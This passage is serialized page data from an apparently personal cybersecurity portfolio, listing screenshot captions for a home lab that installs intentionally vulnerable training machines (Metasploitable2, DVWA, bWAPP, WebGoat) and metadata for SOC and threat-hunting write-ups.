Placing it in the right segment of my network vlan10"},{"src":"/images/projects/hardware-lab/7 Summary of the configuration.png","alt":"7 Summary of the configuration"},{"src":"/images/projects/hardware-lab/8 SSHed into my proxmox server  from parrot OS.png","alt":"8 SSHed into my proxmox server from parrot OS"},{"src":"/images/projects/hardware-lab/9 downloading metasploitable 2.png","alt":"9 downloading metasploitable 2"},{"src":"/images/projects/hardware-lab/10 downloading of the metasploitable 2 in progress.png","alt":"10 downloading of the metasploitable 2 in progress"},{"src":"/images/projects/hardware-lab/11 Metasploitable downloaded successfully.png","alt":"11 Metasploitable downloaded successfully"},{"src":"/images/projects/hardware-lab/12 renaming metasploitable and trying to extract.png","alt":"12 renaming metasploitable and trying to extract"},{"src":"/images/projects/hardware-lab/13 installing unzip for extraction of metasploitable.png","alt":"13 installing unzip for extraction of metasploitable"},{"src":"/images/projects/hardware-lab/14 extracted matasploitable.png","alt":"14 extracted matasploitable"},{"src":"/images/projects/hardware-lab/15 converted metasploitable to another type.png","alt":"15 converted metasploitable to another type"},{"src":"/images/projects/hardware-lab/16 changing the highlighted to point to metasploitable.png","alt":"16 changing the highlighted to point to metasploitable"},{"src":"/images/projects/hardware-lab/17 changing the file to point to metasploitable.png","alt":"17 changing the file to point to metasploitable"},{"src":"/images/projects/hardware-lab/18 AFTER PARROT back to proxmox to confirm insertation of metasploitable vm on created vm MAIN.png","alt":"18 AFTER PARROT back to proxmox to confirm insertation of metasploitable vm on created vm MAIN"},{"src":"/images/projects/hardware-lab/19 AFTER PARROT Error when trying to start the VM.png","alt":"19 AFTER PARROT Error when trying to start the VM"},{"src":"/images/projects/hardware-lab/20 AFTER WINDOWS Editing the storageCFG file to fix the VM not starting issue.png","alt":"20 AFTER WINDOWS Editing the storageCFG file to fix the VM not starting issue"},{"src":"/images/projects/hardware-lab/21 AFTER PARROT metasploitable now started properly.png","alt":"21 AFTER PARROT metasploitable now started properly"},{"src":"/images/projects/hardware-lab/22 AFTER PARROT Confirming the IP address of the metasploitable machine.png","alt":"22 AFTER PARROT Confirming the IP address of the metasploitable machine"},{"src":"/images/projects/hardware-lab/23 AFTER PARROT Pinged my firewall and google and all worked properly.png","alt":"23 AFTER PARROT Pinged my firewall and google and all worked properly"},{"src":"/images/projects/hardware-lab/24 AFTER WINDOWS Accessing Metasploitable dashboard via ip address on parrot os.png","alt":"24 AFTER WINDOWS Accessing Metasploitable dashboard via ip address on parrot os"},{"src":"/images/projects/hardware-lab/25 Creating a test container in docker nginx.png","alt":"25 Creating a test container in docker nginx"},{"src":"/images/projects/hardware-lab/26 nginx deployed.png","alt":"26 nginx deployed"},{"src":"/images/projects/hardware-lab/27 nginx accessed and working.png","alt":"27 nginx accessed and working"},{"src":"/images/projects/hardware-lab/28 confirming my network adapter.png","alt":"28 confirming my network adapter"},{"src":"/images/projects/hardware-lab/29 Network Configuration Complet for vlan30 on portainer.png","alt":"29 Network Configuration Complet for vlan30 on portainer"},{"src":"/images/projects/hardware-lab/30 Vlan30 Config has been created.png","alt":"30 Vlan30 Config has been created"},{"src":"/images/projects/hardware-lab/31 Creating another network and selecting the initially created vlan30 config.png","alt":"31 Creating another network and selecting the initially created vlan30 config"},{"src":"/images/projects/hardware-lab/32 Creating another containder to be under vlan30.png","alt":"32 Creating another containder to be under vlan30"},{"src":"/images/projects/hardware-lab/33 nginx now deplored and having its own dedicated ip address.png","alt":"33 nginx now deplored and having its own dedicated ip address"},{"src":"/images/projects/hardware-lab/34 creating contianer for bwapp.png","alt":"34 creating contianer for bwapp"},{"src":"/images/projects/hardware-lab/35 bwapp login page after installation.png","alt":"35 bwapp login page after installation"},{"src":"/images/projects/hardware-lab/36 dvwa installation.png","alt":"36 dvwa installation"},{"src":"/images/projects/hardware-lab/37 dvwa installed login page accessed.png","alt":"37 dvwa installed login page accessed"},{"src":"/images/projects/hardware-lab/38 webgoat intsallation process.png","alt":"38 webgoat intsallation process"},{"src":"/images/projects/hardware-lab/39 webgoat loging page accessed.png","alt":"39 webgoat loging page accessed"}],"series":{"name":"Project 4.3: Vulnerable Machines Installation (Metasploitable2, DVWA, bWAPP, WebGoat)","part":1,"totalParts":1}}],"oldestProjects":[{"slug":"30-day-mydfir-soc-analyst-challenge-part0","title":"Introduction to the MYDFIR SOC Analyst Challenge","description":"An introduction to the comprehensive 30-day challenge for aspiring SOC analysts.","date":"2024-10-31","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["Blue Team","SOC","Security Monitoring","Training"],"content":"$17","image":"/images/projects/Mydfir 30 day challenge.png","technologies":["ELK Stack","SIEM","Security Tools","Monitoring"],"images":[{"src":"/images/projects/30-day-challenge/30Days-MYDFIR-Challenge.png","alt":"30 Days MYDFIR SOC Analyst Challenge Overview"}],"series":{"name":"Project 3: 30-Day MYDFIR SOC Analyst Challenge","part":0,"totalParts":30}},{"slug":"30-day-soc-analyst-challenge-part1","title":"Part 1: Foundation, A Logical Network Diagram","description":"Learn how to create a comprehensive logical network diagram for your SOC environment, establishing the foundation for my 30-day security monitoring journey.","date":"2024-11-01","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["Network Diagram","SOC","Architecture","Documentation"],"content":"$18","image":"/images/projects/Mydfir 30 day challenge.png","technologies":[],"images":[{"src":"/images/projects/30-day-challenge/1-30Days-MYDFIR-Day-1.png","alt":"30 Days MYDFIR Challenge Day 1"},{"src":"/images/projects/30-day-challenge/2-Day-1-work-with-draw-io.png","alt":"Working with Draw.io on Day 1"}],"series":{"name":"Project 3: 30-Day MYDFIR SOC Analyst Challenge","part":1,"totalParts":30}},{"slug":"30-day-soc-analyst-challenge-part2","title":"Part 2: Diving into the ELK Stack","description":"Explore the powerful ELK stackâElasticsearch, Logstash, and Kibanaâand understand their crucial roles in security operations and log management.","date":"2024-11-02","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["ELK Stack","Elasticsearch","Logstash","Kibana","Log Management"],"content":"$19","image":"/images/projects/Mydfir 30 day challenge.png","technologies":[],"images":[{"src":"/images/projects/30-day-challenge/Day-2-mydfir-soc-analyst-challenge.png","alt":"Day 2 MYDFIR SOC Analyst Challenge"}],"series":{"name":"Project 3: 30-Day MYDFIR SOC Analyst Challenge","part":2,"totalParts":30}}],"newestProjects":[{"slug":"project-5-4-log-n-pacific-internship-threat-hunting-scenario4","title":"Project 5.4: LOG(N) Pacific Internship: Threat Hunting Scenario 4: PwnCrypt Ransomware Outbreak","description":"A comprehensive threat hunting exercise investigating a PwnCrypt ransomware outbreak, using Microsoft Defender for Endpoint to analyze file encryption activities, process execution chains, and ransomware indicators of compromise.","date":"2025-10-24","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["Threat Hunting","Microsoft Defender for Endpoint","Ransomware Analysis","Incident Response","EDR","KQL","PowerShell"],"content":"$1a","image":"/images/projects/Zero-day-red.jpg","technologies":["Microsoft Defender for Endpoint","KQL","PowerShell","Windows"],"images":[],"series":{"name":"Project 5.4: LOG(N) Pacific Internship: Threat Hunting Scenario 4: PwnCrypt Ransomware Outbreak","order":4}},{"slug":"project-5-3-log-n-pacific-internship-threat-hunting-scenario3","title":"Project 5.3: LOG(N) Pacific Internship: Threat Hunting Scenario 3: Suspected Data Exfiltration","description":"A comprehensive threat hunting exercise investigating suspected data exfiltration by a disgruntled employee, using Microsoft Defender for Endpoint to identify unauthorized archiving and data transfer activities within the network.","date":"2025-10-20","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["Threat Hunting","Microsoft Defender for Endpoint","Data Exfiltration","Insider Threat","EDR","KQL","PowerShell"],"content":"$1b","image":"/images/projects/Suspected Data Exfiltration.jpeg","technologies":["Microsoft Defender for Endpoint","KQL","PowerShell","Windows"],"images":[],"series":{"name":"Project 5.3: LOG(N) Pacific Internship: Threat Hunting Scenario 3: Suspected Data Exfiltration","order":3}},{"slug":"project-5-2-log-n-pacific-internship-threat-hunting-scenario2","title":"Project 5.2: LOG(N) Pacific Internship: Threat Hunting Scenario 2: Sudden Network Slowdown","description":"A comprehensive threat hunting exercise investigating sudden network performance degradation caused by internal port scanning activity, using Microsoft Defender for Endpoint to identify unauthorized reconnaissance within the network.","date":"2025-10-14","author":"Samson Otori","client":"Personal Project","challenge":"","solution":"","results":[],"category":"blue","tags":["Threat Hunting","Microsoft Defender for Endpoint","Network Security","Port Scanning","EDR","KQL","PowerShell"],"content":"$1c","image":"/images/projects/Windows Defender Fir..._imresizer.jpg","technologies":["Microsoft Defender for Endpoint","KQL","PowerShell","Windows"],"images":[],"series":{"name":"Project 5.2: LOG(N) Pacific Internship: Threat Hunting Scenario 2: Sudden Network Slowdown","order":2}}],"categoryCounts":{"All":50,"Blue Team":44,"Red Team":2,"Infrastructure":3,"Cloud":1}}]
e:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}]]
b:null
c:null
10:[["$","title","0",{"children":"Samson's | Cybersecurity Portfolio"}],["$","meta","1",{"name":"description","content":"Professional cybersecurity portfolio showcasing expertise in digital security"}],["$","meta","2",{"name":"generator","content":"v0.dev"}],["$","link","3",{"rel":"icon","href":"https://hebbkx1anhila5yf.public.blob.vercel-storage.com/117%20Corporation%20no%20bg-5VVBXF0igK8jcCo43su7cpA2isco7t.png"}]]
